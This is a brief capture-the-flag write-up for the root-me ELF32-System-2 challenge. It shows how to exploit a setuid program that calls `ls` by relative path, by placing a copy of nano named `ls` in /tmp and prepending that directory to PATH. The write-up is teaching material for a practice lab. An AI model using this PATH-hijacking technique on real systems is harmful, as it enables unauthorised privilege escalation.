# Bash: System 2

[root-me challenge: ELF32-System-2](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2): Simple script

----

The `ls` command is not using an absolute path. Create a script to run cat and ignore the flags (create `/tmp/ls` and then invoke ch12 with a modified path), or use an existing binary like `nano`:

```text
app-script-ch12@challenge02:~$ mkdir /tmp/challenge
app-script-ch12@challenge02:~$ cp /bin/nano /tmp/challenge/ls
app-script-ch12@challenge02:~$ export PATH=/tmp/challenge:$PATH
app-script-ch12@challenge02:~$ ./ch12
Unable to create directory /challenge/app-script/ch12/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

Press Enter to continue
```

## Resources

* [section-7.html](http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html)
